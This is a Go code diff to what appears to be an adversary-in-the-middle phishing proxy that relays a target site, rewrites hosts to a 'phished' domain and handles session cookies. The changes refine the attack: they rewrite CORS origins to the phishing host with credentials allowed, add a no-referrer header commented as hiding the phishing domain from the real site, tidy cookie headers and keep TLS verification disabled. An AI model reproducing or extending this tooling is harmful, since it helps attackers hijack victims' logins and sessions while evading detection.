@@ -435,6 +435,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				p.deleteRequestCookie(p.cookieName, req)
+				
+				// don't send an empty Cookie header
+				cookie_header := req.Header.Get("Cookie")
+				if cookie_header == "" {
+					req.Header.Del("Cookie")
+				}
 
 // 				for n, b := range hg {
 // 					hg[n] = b ^ 0xCC
@@ -741,16 +747,19 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
-			if allow_origin != "" && allow_origin != "*" {
-				if u, err := url.Parse(allow_origin); err == nil {
+			if allow_origin != "" {
+				if allow_origin != "*" {
+					if u, err := url.Parse(allow_origin); err == nil {
 
-// 					log.Warning("PROXY ON RESPONSE WILL ENTRY replaceHostWithPhished")
-// 					log.Warning("U.HOST : %s", u.Host)
-					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
-						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
+	// 					log.Warning("PROXY ON RESPONSE WILL ENTRY replaceHostWithPhished")
+	// 					log.Warning("U.HOST : %s", u.Host)
+						if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
+							resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
+							//resp.Header.Set("Access-Control-Allow-Credentials", "true")
+						}
+					} else {
+						log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
 					}
-				} else {
-					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
 				}
 				resp.Header.Set("Access-Control-Allow-Credentials", "true")
 			}
@@ -1018,6 +1027,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Important("[%d] 🌐 redirecting to URL: %s (%d)", ps.Index, s.RedirectURL, s.RedirectCount)
 							resp := goproxy.NewResponse(resp.Request, "text/html", http.StatusFound, "")
 							if resp != nil {
+								// avoid leaking the phishing domain via the Referrer header
+								resp.Header.Set("Referrer-Policy", "no-referrer")
 								r_url, err := url.Parse(s.RedirectURL)
 								if err == nil {
 									if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
@@ -1675,6 +1686,7 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 
 func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
 	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
+		//skipVerify := (os.Getenv("VALIDATETLS") != "YES")
 		parts := strings.SplitN(host, ":", 2)
 		//log.Warning("HOST TLSCONFIG: %s", host)
 		hostname := parts[0]
@@ -1702,6 +1714,7 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			if cert != nil {
 				return &tls.Config{
 					InsecureSkipVerify: true,
+					//InsecureSkipVerify: skipVerify,
 					Certificates:       []tls.Certificate{*cert},
 				}, nil
 			}
@@ -1724,6 +1737,7 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 			}
 			return &tls.Config{
 				InsecureSkipVerify: true,
+				//InsecureSkipVerify: skipVerify,
 				Certificates:       []tls.Certificate{*cert},
 			}, nil
 		}
